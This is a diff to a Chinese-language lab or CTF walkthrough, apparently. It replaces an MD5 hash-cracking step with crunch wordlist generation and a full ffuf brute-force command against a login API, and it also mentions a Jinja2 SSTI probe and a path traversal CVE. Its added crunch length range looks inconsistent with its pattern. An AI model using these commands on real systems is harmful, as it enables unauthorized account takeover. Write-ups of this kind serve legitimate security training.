@@ -18,9 +18,10 @@
 *   **FTP 滲透**：
     *   從 `/changelog` 發現匿名 FTP 服務的存在。
     *   在 FTP 的 `/backup_logs/` 目錄下載 `credentials.bak`。
-    *   **雜湊破解**：發現 `guest` 的 MD5 雜湊 `056345ec46872584ec6f555bc4390f72` 與模式提示 `[username][digits]`。
-    *   利用 `crunch` 產生小字典：`crunch 8 8 -t guest%%% -o mini.txt`
-    *   使用 `hashcat` 破解得到密碼：`guest123`。
+    *   **憑證爆破**：發現 `guest` 帳號資訊與模式提示 `[username][digits]`，以及建議使用的 `ffuf` 指令。
+    *   利用 `crunch` 產生自定義字典：`crunch 8 10 -t guest%%% -o wordlist.txt`
+    *   使用 `ffuf` 進行爆破得到密碼：`guest123`。
+        `ffuf -w wordlist.txt -u http://<TARGET_IP>:8080/api/login -X POST -H "Content-Type: application/json" -d '{"username":"guest","password":"FUZZ"}' -fr "帳號或密碼錯誤"`
 *   **SSTI**：使用 `guest/guest123` 登入後，利用產品評論功能的 Jinja2 漏洞 (`{{ config }}`) 獲取賣家 (Seller) 憑據。
 
 ### 第二階段：路徑穿越 (CVE-2024-23334)
